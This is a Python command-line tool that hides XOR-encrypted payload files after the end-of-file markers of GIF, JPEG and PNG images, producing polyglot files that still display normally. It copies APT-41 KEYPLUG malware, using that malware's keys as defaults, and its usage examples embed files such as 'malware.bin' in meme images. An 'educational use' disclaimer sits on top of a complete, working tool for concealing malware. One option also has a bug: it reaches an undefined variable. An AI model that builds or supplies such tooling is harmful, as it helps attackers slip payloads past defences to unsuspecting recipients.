#!/usr/bin/env python3
"""
Polyglot Image Payload Embedder
================================
Embeds encrypted payloads into image files after EOF markers.

EDUCATIONAL/RESEARCH USE ONLY
This tool demonstrates the polyglot malware technique for security research.

Author: SWORDIntel
Date: 2025-11-08
"""

import sys
import os
import argparse
from pathlib import Path


class PolyglotEmbedder:
    """Embeds payloads into images after their EOF markers"""

    # Image format EOF markers
    EOF_MARKERS = {
        'gif': b'\x3b',                    # GIF trailer
        'jpg': b'\xff\xd9',                # JPEG EOI marker
        'jpeg': b'\xff\xd9',               # JPEG EOI marker
        'png': b'\x49\x45\x4e\x44\xae\x42\x60\x82',  # PNG IEND chunk
    }

    def __init__(self, verbose=False):
        self.verbose = verbose

    def log(self, message):
        """Print if verbose mode enabled"""
        if self.verbose:
            print(f"[*] {message}")

    def xor_encrypt(self, data, key):
        """Multi-layer XOR encryption (APT-41 KEYPLUG style)"""
        if isinstance(key, str):
            key = bytes.fromhex(key) if all(c in '0123456789abcdefABCDEF' for c in key) else key.encode()

        encrypted = bytearray(len(data))
        key_len = len(key)

        for i in range(len(data)):
            encrypted[i] = data[i] ^ key[i % key_len]

        return bytes(encrypted)

    def multi_layer_encrypt(self, data, keys):
        """Apply multiple XOR layers (like KEYPLUG malware)"""
        result = data
        for key in keys:
            self.log(f"Applying XOR layer with key: {key if isinstance(key, str) else key.hex()}")
            result = self.xor_encrypt(result, key)
        return result

    def get_image_format(self, image_path):
        """Detect image format from extension and verify header"""
        ext = Path(image_path).suffix.lower().lstrip('.')

        # Verify image header
        with open(image_path, 'rb') as f:
            header = f.read(16)

        if header.startswith(b'GIF8'):
            return 'gif'
        elif header.startswith(b'\xff\xd8\xff'):
            return 'jpg'
        elif header.startswith(b'\x89PNG'):
            return 'png'
        else:
            raise ValueError(f"Unsupported or invalid image format: {image_path}")

    def find_eof(self, image_data, image_format):
        """Find the last occurrence of EOF marker"""
        eof_marker = self.EOF_MARKERS.get(image_format)
        if not eof_marker:
            raise ValueError(f"Unknown image format: {image_format}")

        eof_pos = image_data.rfind(eof_marker)
        if eof_pos == -1:
            raise ValueError(f"EOF marker not found for {image_format} format")

        # Return position after the EOF marker
        return eof_pos + len(eof_marker)

    def embed_payload(self, image_path, payload_path, output_path,
                     xor_keys=None, keep_original=True):
        """
        Embed encrypted payload into image file

        Args:
            image_path: Path to source image
            payload_path: Path to payload file (script/binary)
            output_path: Path for output polyglot file
            xor_keys: List of XOR keys for multi-layer encryption (default: KEYPLUG keys)
            keep_original: If True, keeps original image data intact
        """
        # Default KEYPLUG-style keys
        if xor_keys is None:
            xor_keys = ['9e', '0a61200d']  # APT-41 common keys

        self.log(f"Reading image: {image_path}")
        with open(image_path, 'rb') as f:
            image_data = f.read()

        self.log(f"Reading payload: {payload_path}")
        with open(payload_path, 'rb') as f:
            payload_data = f.read()

        # Detect image format
        img_format = self.get_image_format(image_path)
        self.log(f"Detected format: {img_format.upper()}")

        # Find EOF position
        if keep_original:
            eof_pos = self.find_eof(image_data, img_format)
            self.log(f"Image EOF found at offset: {eof_pos} (0x{eof_pos:x})")
            carrier_data = image_data[:eof_pos]
        else:
            # Optionally corrupt/truncate image
            carrier_data = image_data

        # Encrypt payload
        self.log(f"Encrypting payload ({len(payload_data)} bytes)")
        encrypted_payload = self.multi_layer_encrypt(payload_data, xor_keys)
        self.log(f"Encrypted size: {len(encrypted_payload)} bytes")

        # Create polyglot file
        polyglot_data = carrier_data + encrypted_payload

        self.log(f"Writing polyglot file: {output_path}")
        with open(output_path, 'wb') as f:
            f.write(polyglot_data)

        # Statistics
        original_size = len(image_data)
        new_size = len(polyglot_data)
        overhead = new_size - original_size

        print(f"\n[+] Polyglot created successfully!")
        print(f"    Original image: {original_size:,} bytes")
        print(f"    Payload size: {len(payload_data):,} bytes")
        print(f"    Encrypted payload: {len(encrypted_payload):,} bytes")
        print(f"    Final polyglot: {new_size:,} bytes")
        print(f"    Overhead: +{overhead:,} bytes ({overhead/original_size*100:.1f}%)")
        print(f"\n[+] Image should still display normally!")
        print(f"[+] Payload hidden after byte {eof_pos:,}")

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Embed payloads into images (KEYPLUG-style polyglot)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic usage with default KEYPLUG keys
  %(prog)s meme.gif payload.sh output.gif

  # Custom single XOR key
  %(prog)s photo.jpg malware.bin stego.jpg -k d3

  # Multi-layer encryption (like APT-41)
  %(prog)s image.png script.sh output.png -k 9e -k 0a61200d -k 41414141

  # Corrupt the image (make it unviewable but smaller)
  %(prog)s large.jpg payload.bin small.jpg --no-keep-original

WARNING: For educational and authorized security research only!
        """
    )

    parser.add_argument('image', help='Input image file (GIF/JPG/PNG)')
    parser.add_argument('payload', help='Payload file to embed')
    parser.add_argument('output', help='Output polyglot file')
    parser.add_argument('-k', '--key', dest='keys', action='append',
                       help='XOR key (hex or string, can be used multiple times for layers)')
    parser.add_argument('--no-keep-original', action='store_false', dest='keep_original',
                       help='Do not preserve original image (smaller but corrupted)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    # Validate input files
    if not os.path.exists(args.image):
        print(f"[!] Error: Image file not found: {args.image}", file=sys.stderr)
        return 1

    if not os.path.exists(args.payload):
        print(f"[!] Error: Payload file not found: {args.payload}", file=sys.stderr)
        return 1

    # Create embedder
    embedder = PolyglotEmbedder(verbose=args.verbose)

    try:
        embedder.embed_payload(
            args.image,
            args.payload,
            args.output,
            xor_keys=args.keys,
            keep_original=args.keep_original
        )
        return 0
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
